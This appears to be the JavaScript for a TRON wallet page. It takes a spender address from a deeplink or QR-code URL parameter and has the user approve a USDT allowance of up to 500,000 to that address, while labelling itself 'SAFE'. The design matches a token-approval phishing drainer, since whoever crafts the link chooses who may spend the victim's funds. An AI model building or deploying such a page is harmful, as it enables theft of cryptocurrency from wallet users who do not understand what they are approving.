// app.js — Deeplink-driven spender (SAFE)

const btnNext = document.getElementById('btn-next');
const statusDiv = document.getElementById('status');
const spenderInput = document.getElementById('spender');
const amountInput = document.getElementById('amount');

const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const MAX_APPROVAL_USDT = 500000;

// -------------------------
// Deeplink / QR autofill
// -------------------------
(function autofill() {
  const params = new URLSearchParams(window.location.search);
  const addr =
    params.get('spender') ||
    params.get('address') ||
    params.get('to');

  if (addr && /^T[a-zA-Z0-9]{33}$/.test(addr)) {
    spenderInput.value = addr;
  }
})();

// -------------------------
// Approve handler
// -------------------------
btnNext.addEventListener('click', async () => {
  if (!window.tronWeb) {
    statusDiv.textContent = "Open in TRON wallet browser";
    return;
  }

  const spender = spenderInput.value.trim();
  if (!/^T[a-zA-Z0-9]{33}$/.test(spender)) {
    statusDiv.textContent = "Invalid TRON address";
    return;
  }

  let amountUsdt = Number(amountInput.value);
  if (!amountUsdt || amountUsdt <= 0) {
    statusDiv.textContent = "Enter valid amount";
    return;
  }

  amountUsdt = Math.min(amountUsdt, MAX_APPROVAL_USDT);

  try {
    statusDiv.textContent = `Approving ${amountUsdt} USDT...`;

    const usdt = await window.tronWeb.contract().at(USDT_CONTRACT);
    const amount = window.tronWeb
      .toBigNumber(amountUsdt)
      .times(1e6)
      .toString();

    await usdt.approve(spender, amount).send({
      feeLimit: 100_000_000
    });

    statusDiv.textContent = `Approval successful (${amountUsdt} USDT)`;
  } catch (e) {
    statusDiv.textContent = "Transaction rejected or failed";
  }
});
